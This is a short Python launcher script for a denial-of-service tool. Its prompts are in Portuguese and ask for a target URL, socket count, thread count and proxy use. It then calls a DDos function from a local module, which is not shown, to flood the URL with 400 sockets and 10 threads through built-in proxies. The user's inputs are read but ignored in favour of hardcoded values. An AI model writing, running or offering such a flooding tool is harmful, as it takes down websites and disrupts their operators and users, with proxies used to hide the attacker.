import sys
sys.path.insert(0, './DDos')

from DDos import checkUrl, DDos
while True:
    url = input("Informe a URL: ")
    sockets = input("Sockets (padrão = 400):")
    threads = input("Threads (padrão = 10):")
    use_proxies = input("Usar proxys? (padrão = True):")

    if checkUrl(url): break
    else: print("Esta URL não está corretamente formatada, tente novamente")
DDos(url, sockets = 400, threads = 10, use_proxies = True) # ddos this url with 400 sockets and 10 threads and use the built-it proxies
